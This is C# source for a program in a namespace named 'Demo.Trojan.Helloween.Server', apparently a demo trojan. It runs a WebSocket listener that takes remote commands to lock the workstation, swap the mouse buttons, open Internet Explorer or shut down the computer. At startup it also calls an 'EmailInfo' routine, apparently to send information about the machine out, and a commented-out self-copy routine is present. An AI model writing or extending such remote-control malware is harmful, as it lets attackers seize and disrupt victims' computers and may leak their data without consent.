using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

using Fleck;
namespace Demo.Trojan.Helloween.Server
{
    class Program
    {
        
        static void Main(string[] args)
        {

            Funcoes.EmailInfo();
            //Funcoes.AutoCopiar();
            var socket = new WebSocketServer("ws://172.16.175.129:6969");
            socket.Start(client =>
            {
                client.OnOpen = () =>  Console.WriteLine("Connected {0}", client.ConnectionInfo.ClientIpAddress );
                
                client.OnClose = () => Console.WriteLine("{0} - Desconectou", client.ConnectionInfo.ClientIpAddress);

                client.OnMessage = (comando) =>
                {
                    switch (comando)
                    {
                        case "open_ie":
                            Funcoes.AbrirInternetExplorer();
                            break;
                        case "lock_system":
                            Funcoes.BloquearEstacao();
                            break;
                        case "inverter_botoes":
                            Funcoes.InverterBotoesMouse(true);
                            break;
                        case "normalizar_botoes":
                            Funcoes.InverterBotoesMouse(false);
                            break;
                        case "desligar_computador":
                            Funcoes.DesligarComputador();
                            break;
                        
                        default:
                            break;
                    }
                };
            });
            
            while (true)
            {

            }
        }
    }
}
